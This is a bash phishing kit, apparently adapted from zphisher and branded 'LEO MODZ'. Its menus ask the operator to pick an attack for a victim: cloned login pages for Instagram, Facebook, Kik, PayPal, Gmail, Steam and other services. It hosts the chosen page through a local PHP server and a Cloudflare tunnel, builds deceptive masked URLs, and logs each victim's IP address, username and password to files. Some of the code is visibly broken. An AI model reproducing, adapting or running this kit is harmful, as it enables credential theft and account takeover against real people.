## Credits to tr-tech (https://github.com/htr-tech/zphisher/)
##ANSI colors
RED="$(printf '\033[31m')"
GREEN="$(printf '\033[32m')"
BLUE="$(printf '\033[34m')"
CYAN="$(printf '\033[36m')"
WHITE="$(printf '\033[37m')"


if [[ ! -d ".server" ]]; then
	mkdir -p ".server"
fi

if [[ ! -d "auth" ]]; then
	mkdir -p "auth"
fi

if [[ -d ".server/www" ]]; then
	rm -rf ".server/www"
	mkdir -p ".server/www"
else
	mkdir -p ".server/www"
fi

if [[ -e ".server/.cld.log" ]]; then
	rm -rf ".server/.cld.log"
fi

exit_on_signal_SIGINT() {
    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Programa interrompido." 2>&1; reset_color; }
    exit 0
}

exit_on_signal_SIGTERM() {
    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Programa encerrado.." 2>&1; reset_color; }
    exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM


reset_color() {
	tput sgr0
	tput op
    return
}


kill_pid() {
	check_PID="php cloudflared"
	for process in ${check_PID}; do
		if [[ $(pidof ${process}) ]]; then # Check for Process
			killall ${process} > /dev/null 2>&1 # Kill the Process
		fi
	done
}



banner() {
	cat <<- EOF
	{RED}  _   _   _   _   _   _   _   _  _  
		${RED} / \ / \ / \ / \ / \ / \ / \ / \ /  |
		${RED}(HACKIG TOOLS BY LEO MODZ)   |
		${RED} \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ |
		${GREEN}				    VERSÃO: V1..1
		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by LEO MODZ SECURITY${WHITE}
	EOF
}


banner_small() {
	cat <<- EOF
		${RED}  _   _   _   _   _   _   _   _  _  
		${RED} / \ / \ / \ / \ / \ / \ / \ / \ /  |
		${RED}(HACKIG TOOLS BY LEO MODZ)   |
		${RED} \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ |
		${GREEN}				    VERSÃO: V1.1
	EOF
}


dependencies() {
	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalando os pacotes necessários..."

    if [[ -d "/data/data/com.termux/files/home" ]]; then
        if [[ `command -v proot` ]]; then
            printf ''
        else
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalando pacote : ${GREEN}proot${CYAN}"${WHITE}
            pkg install proot resolv-conf -y
        fi
    fi

	if [[ `command -v php` && `command -v wget` && `command -v curl` && `command -v unzip` ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Pacotes já instalados."
	else
		pkgs=(php curl wget unzip)
		for pkg in "${pkgs[@]}"; do
			type -p "$pkg" &>/dev/null || {
				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalando pacote: ${GREEN}$pkg${CYAN}"${WHITE}
				if [[ `command -v pkg` ]]; then
					pkg install "$pkg"
				elif [[ `command -v apt` ]]; then
					apt install "$pkg" -y
				elif [[ `command -v apt-get` ]]; then
					apt-get install "$pkg" -y
				elif [[ `command -v pacman` ]]; then
					sudo pacman -S "$pkg" --noconfirm
				elif [[ `command -v dnf` ]]; then
					sudo dnf -y install "$pkg"
				else
					echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Gerenciador de pacotes sem suporte, Instalar pacotes manualmente")
					{ reset_color; exit 1; }
				fi
			}
		done
	fi
}

download() {
	url="$1"
	output="$2"
	file=`basename $url`
	if [[ -e "$file" || -e "$output" ]]; then
		rm -rf "$file" "$output"
	fi
	curl --silent --insecure --fail --retry-connrefused \
		--retry 3 --retry-delay 2 --location --output "${file}" "${url}"

	if [[ -e "$file" ]]; then
		if [[ ${file#*.} == "zip" ]]; then
			unzip -qq $file > /dev/null 2>&1
			mv -f $output .server/$output > /dev/null 2>&1
		elif [[ ${file#*.} == "tgz" ]]; then
			tar -zxf $file > /dev/null 2>&1
			mv -f $output .server/$output > /dev/null 2>&1
		else
			mv -f $file .server/$output > /dev/null 2>&1
		fi
		chmod +x .server/$output > /dev/null 2>&1
		rm -rf "$file"
	else
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading ${output}."
		{ reset_color; exit 1; }
	fi
}

install_cloudflared() {
	if [[ -e ".server/cloudflared" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
		else
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
		fi
	fi
}

msg_exit() {
	{ clear; banner; echo; }
	echo -e "${GREENBG}${BLACK}Obrigado por usar esta ferramenta, tenha um bom dia!${RESETBG}\n"
	{ reset_color; exit 0; }
}


about() {
	{ clear; banner; echo; }
	cat <<- EOF
		${GREEN}Author   ${RED}:  ${CYAN}LEO MODZ OFC
		${GREEN}TELEGTAM   ${RED}:  ${CYAN}https://t.me/LEOMODZIFC
		${GREEN}SOCIAL   ${RED}:  
		${GREEN}VERSÃO ${RED}:  ${CYAN}1.1
		${RED}[${WHITE}00${RED}]${ORANGE} MENU INICIAL
	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Selecione uma opção : ${BLUE}"

	if [[ "$REPLY" == 5 ]]; then
		msg_exit
	elif [[ "$REPLY" == 0 || "$REPLY" == 00 ]]; then
		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Retornando ao menu principal..."		
		{ sleep 1; main_menu; }
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opção inválida, tente novamente..."
		{ sleep 1; about; }
	fi
}


HOST='127.0.0.1'
PORT='80'

setup_site() {
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Configurando o servidor..."${WHITE}
	cp -rf .sites/"$website"/* .server/www
	cp -f .sites/ip.php .server/www/
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} INICIANDO PHP SERVER..."${WHITE}
	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
}


capture_ip() {
	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${GREEN}ip.txt"
	cat .server/www/ip.txt >> ip.txt
}


capture_creds() {
	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | cut -d " " -f2)
	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | cut -d ":" -f2)
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${GREEN}usernames.dat"
	cat .server/www/usernames.txt >> usernames.dat
	echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
}


capture_data() {
	echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
	while true; do
		if [[ -e ".server/www/ip.txt" ]]; then
			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
			capture_ip
			rm -rf .server/www/ip.txt
		fi
		sleep 0.75
		if [[ -e ".server/www/usernames.txt" ]]; then
			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!"
			capture_creds
			rm -rf .server/www/usernames.txt
		fi
		sleep 0.75
	done
}

start_cloudflared() { 
    rm .cld.log > /dev/null 2>&1 &
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; }
	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."

	if [[ `command -v termux-chroot` ]]; then
		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
	else
		sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
	fi

	{ sleep 8; clear; banner_small; }
	
	cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
	cldflr_link1=${cldflr_link#https://}
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$cldflr_link"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$cldflr_link1"
	capture_data
}

start_localhost() {
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	setup_site
	{ sleep 1; clear; banner_small; }
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
	capture_data
}


tunnel_menu() {
	{ clear; banner_small; }
	cat <<- EOF
		${RED}[${WHITE}01${RED}]${CYAN} Localhost ${RED}[${CYAN}For Devs${RED}]
		${RED}[${WHITE}02${RED}]${CYAN} Cloudflared ${RED}[${CYAN}New${RED}]
	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a port forwarding service : ${BLUE}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		start_localhost
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		start_cloudflared
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opção inválida, tente novamente..."
		{ sleep 1; tunnel_menu; }
	fi
}

## Instagram
site_instagram() {
	cat <<- EOF
		${RED}[${WHITE}01${RED}]${CYAN} Instagram Login Page
		${RED}[${WHITE}02${RED}]${CYAN} Instagram Increase Followers Page
		${RED}[${WHITE}03${RED}]${CYAN} Instagram Increase Followers(1) Page
	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Selecione uma opção : ${BLUE}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		website="ig"
		mask='https://instagram-login'
		tunnel_menu
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		website="ig_followers"
		mask='https://instagram-followers'
		tunnel_menu
	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
		website="ig_increase"
		mask='https://increase-followers'
		tunnel_menu
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opção inválida, tente novamente..."
		{ sleep 1; clear; banner_small; site_instagram; }
	fi
}

## Kik
site_kik() {
	cat <<- EOF
		${RED}[${WHITE}01${RED}]${CYAN} Página de login do Kik
		${RED}[${WHITE}02${RED}]${CYAN} Página de desbloqueio do Ragebot
		${RED}[${WHITE}03${RED}]${CYAN} Página Anvil Unbrick
		${RED}[${WHITE}04${RED}]${CYAN} Página de login do Mediafire para Kik
	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Selecione uma opção : ${BLUE}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		website="kik_main"
		mask='https://kik.com-free-videos'
		tunnel_menu
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		website="kik_unbrik"
		mask='https://kik.com-unbrik'
		tunnel_menu
	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
		website="kik_anvil"
		mask='https://kik.anvil-unbrick'
		tunnel_menu
	elif [[ "$REPLY" == 4 || "$REPLY" == 04 ]]; then
		website="kik"
		mask='https://kik.com-videos'
		tunnel_menu
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opção inválida, tente novamente..."
		{ sleep 1; clear; banner_small; site_kik; }
	fi
}

## Facebook
site_facebook() {
	cat <<- EOF
		${RED}[${WHITE}01${RED}]${CYAN} Facebook Login Page
		${RED}[${WHITE}02${RED}]${CYAN} Messenger Login Page
	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Selecione uma opção : ${BLUE}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		website="fb"
		mask='https://facebook-login'
		tunnel_menu
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		website="fb_messenger"
		mask='https://messenger-login'
		tunnel_menu
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opção inválida, tente novamente..."
		{ sleep 1; clear; banner_small; site_facebook;
	fi
}

## Menu
main_menu() {
	{ clear; banner; echo; }
	cat <<- EOF
		${RED}[${WHITE}::${RED}]${GREEN} Selecione um ataque para sua vítima ${RED}[${WHITE}::${RED}]${GREEN}
		
		${RED}[${WHITE}01${RED}]${CYAN} Snapchat
		${RED}[${WHITE}02${RED}]${CYAN} Instagram
		${RED}[${WHITE}03${RED}]${CYAN} Kik
		${RED}[${WHITE}04${RED}]${CYAN} Facebook
		${RED}[${WHITE}05${RED}]${CYAN} Dropbox
		${RED}[${WHITE}06${RED}]${CYAN} PayPal
		${RED}[${WHITE}07${RED}]${CYAN} TikTok
		${RED}[${WHITE}08${RED}]${CYAN} Steam
		${RED}[${WHITE}09${RED}]${CYAN} Gmail
		${RED}[${WHITE}10${RED}]${CYAN} LinkdIn
		
		${RED}[${WHITE}99${RED}]${CYAN} About
		${RED}[${WHITE}00${RED}]${CYAN} Exit
	EOF
	
	read -p "${RED}[${WHITE}-${RED}]${GREEN} Selecione uma opção : ${BLUE}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		website="sc"
		mask='https://snapchat-login'
		tunnel_menu
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		{ clear; banner_small; }
		site_instagram
	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
		{ clear; banner_small; }
		site_kik
	elif [[ "$REPLY" == 4 || "$REPLY" == 04 ]]; then
		{ clear; banner_small; }
		site_facebook
	elif [[ "$REPLY" == 5 || "$REPLY" == 05 ]]; then
		website="dropbox"
		mask='https://dropbox-login'
		tunnel_menu
	elif [[ "$REPLY" == 6 || "$REPLY" == 06 ]]; then
		website="paypal"
		mask='https://paypal-login'
		tunnel_menu
	elif [[ "$REPLY" == 7 || "$REPLY" == 07 ]]; then
		website="tiktok"
		mask='https://tiktok-login'
		tunnel_menu
	elif [[ "$REPLY" == 8 || "$REPLY" == 08 ]]; then
		website="steam"
		mask='https://steam-login'
		tunnel_menu
	elif [[ "$REPLY" == 9 || "$REPLY" == 09 ]]; then
		website="gmail"
		mask='https://gmail-login'
		tunnel_menu
	elif [[ "$REPLY" == 10 ]]; then
		website="linkdin"
		mask='https://linkdin-login'
		tunnel_menu
	elif [[ "$REPLY" == 99 ]]; then
		about
	elif [[ "$REPLY" == 0 || "$REPLY" == 00 ]]; then
		msg_exit
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opção inválida, tente novamente..."
		{ sleep 1; main_menu; }
	fi
}


kill_pid
dependencies
install_cloudflared
main_menumain_menu
